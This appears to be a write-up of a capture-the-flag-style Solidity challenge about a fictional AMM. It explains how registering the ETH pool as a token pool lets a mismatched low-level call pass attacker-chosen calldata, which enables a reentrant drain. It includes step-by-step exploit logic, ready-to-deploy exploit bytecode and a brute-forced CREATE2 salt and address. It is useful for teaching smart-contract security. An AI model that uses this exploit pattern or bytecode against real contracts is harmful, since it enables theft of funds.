# Intro

Well, so you looked at the code and saw that the team has this nice kind of multi-transaction `deposit()` function. They get the serialized parameters from the user, chek if it is an ETH pool or a token pool, and then use the correct selector for the contract. However...what would happen if the wrong contract is used? The selector must match, otherwise Solidity will reject the call. But, what would happen if the wrong encoded parameters are given? Sure, Solidity would check that the type of the parameters is correct, right? Or at least that the amount of serialized data is correct, right? Right??

# The Hack

You can check `VeryCoolAMMExploit.sol` for an example of the exploit contract (just missing the withdraw function).

-   The first thing for the hack to work is to fetch the `VeryCoolPeryphery.defaultETHPool()` and add it back as a token pool with `VeryCoolPeryphery`.addTokenPool()
-   The function `VeryCoolPeryphery.\_getSelector()` checks first if the given pool is an ETH pool and returns the correct selector for the `deposit()` function. However the `VeryCoolPeryphery.\_getCallData()` first checks if the pool is a Token pool. Because the ETH pool is now registered as both types of pool, this causes the contract to call the `VeryCoolPoolETH` contract with the right selector but the wrong serialized data
-   This is particularly dangerous because the call data for `VeryCoolETHPool.deposit()` is shorter than the call data for `VeryCoolTokenPool.deposit()`. Even though VeryCoolPeryphery injects the correct `msg.sender` and the correct third-party staking pool, the attacker can actually change the timestamp and the third-party staking pool to whatever she wants
-   There is one limitation though: the attacker can only control 128 bits of the third-party staker address, so she must find the right salt for a `Create2` call that generates an address which first 32-bits are set to zero. This is difficult, but definitely not impossible. Below this section you can find an example salt that generates the right address for `VeryCoolAMMExploit.sol`
-   The attacker then deploys the attacking contract on the generated address. This contract calls `VeryCoolPeryphery.deposit()` with the `defaultETHPool` and the two `uint128` serialized parameters. The first `uint128` will be the timestamp for the withdrawal time, that will be set to `bock.timestamp+1` to be able to withdraw on the very next second. The second `uint128` is the address of the deployed exploit contract (that only has 128-bits). This causes `VeryCoolPeryphery` to call into the `VeryCoolETHPool.deposit()` with the user-given timestamp and the address of the exploiting contract
-   The `VeryCoolETHPool` adds the amount of ETH received to the balance of the exploiting contract, and marks the funds locked until the given timestamp (which will be the very next second). Then it calls back into the given staker, which is of course the exploiting contract, thus giving back all the ETH to the attacker. The exploiting contract could rinse and repeat before running out of gas for a reentrancy attack.
-   Finally, withdraw much more than given (actually, infinite more times than given ;) ) for profit

# 128-bits Address Generation

In order for this hack to work, the hacker should be able to generate an address with only 128-bits, being the first 32 bits zero. This relies on a brute-force attack in which you have a probability of 1/(2^32) of finding such an address. Even though it is a small probability, you can run millions of hashes per second, and you can find such an address in just a few hours on a regular laptop.

For this entry I wrote a small C program to generate Create2 addresses where the first 32-bits are zero. It took around 30 minutes to find one, although testing other set of data it could take around 2 hours. I show the result here as an example. Deployer address is Metamorphic's factory contract on Ethereum Mainnet. It could be directly used to deploy the exploit and hack the protocol:

## Deployer

[Metamorphic Factory Mainnet contract](https://github.com/0age/metamorphic)
0x00000000e82eb0431756271F0d00CFB143685e7B

## Bytecode

0x608060405234801561001057600080fd5b50610433806100206000396000f3fe6080604052600436106100295760003560e01c80633a4b66f11461002e578063d207604d14610038575b600080fd5b61003661004b565b005b610036610046366004610267565b610072565b600254156100705760028054906000610063836102b9565b91905055506100706100b4565b565b600080546001600160a01b038086166001600160a01b031992831617909255600180549285169290911691909117905560028190556100af6100b4565b505050565b60408051600180825281830190925260009160208083019080368337505060015482519293506001600160a01b0316918391506000906100f6576100f66102d0565b6001600160a01b039290921660209283029190910190910152604080516001808252818301909252600091816020015b60608152602001906001900390816101265790505090506101484260016102e6565b6040805160208101929092526fffffffffffffffffffffffffffffffff30169082015260600160405160208183030381529060405281600081518110610190576101906102d0565b602090810291909101015260408051600180825281830190925260009181602001602082028036833701905050905034816000815181106101d3576101d36102d0565b60209081029190910101526000546040516313be2c6360e11b81526001600160a01b039091169063277c58c690349061021490879087908790600401610339565b6000604051808303818588803b15801561022d57600080fd5b505af1158015610241573d6000803e3d6000fd5b5050505050505050565b80356001600160a01b038116811461026257600080fd5b919050565b60008060006060848603121561027c57600080fd5b6102858461024b565b92506102936020850161024b565b9150604084013590509250925092565b634e487b7160e01b600052601160045260246000fd5b6000816102c8576102c86102a3565b506000190190565b634e487b7160e01b600052603260045260246000fd5b600082198211156102f9576102f96102a3565b500190565b600081518084526020808501945080840160005b8381101561032e57815187529582019590820190600101610312565b509495945050505050565b606080825284519082018190526000906020906080840190828801845b8281101561037b5781516001600160a01b031684529284019290840190600101610356565b50505083810382850152855180825282820190600581901b8301840188850160005b8381101561040457601f19808785030186528251805180865260005b818110156103d4578281018b01518782018c01528a016103b9565b818111156103e55760008b83890101525b5096890196601f0190911693909301870192509086019060010161039d565b5050868103604088015261041881896102fe565b9a995050505050505050505056fea164736f6c6343000809000a

## Salt

000000000000000000000000000000000000000000000000000000004dcd27b5

## Generated Address

0x00000000125fd11e858acfe3af6797cc16976612

# Summary

This entry aims to show how Solidity serializes data and how low-level function call works. Also it hints to the characteristics of entropy when generating deterministic addresses. In particular:

-   Basic data types like **uint128**, **bool** or **address** are serialized as **uint256** values
-   When using low-level call, even through _OpenZeppelin_ `Address.functionCall()`, the type or size of parameters is NOT checked. This particularly means that you can pass more data than needed to the function call and it will be accepted.
-   It is possible for an attacker to generate `Create2` addressess that fit in less than 160-bits
-   Check carefully all the implications derived from the use of functions by unpriviledged users
-   Order of checks in if...else may be important when working with serialized data

Hope you liked it! I definitely had a lot of fun with it :)
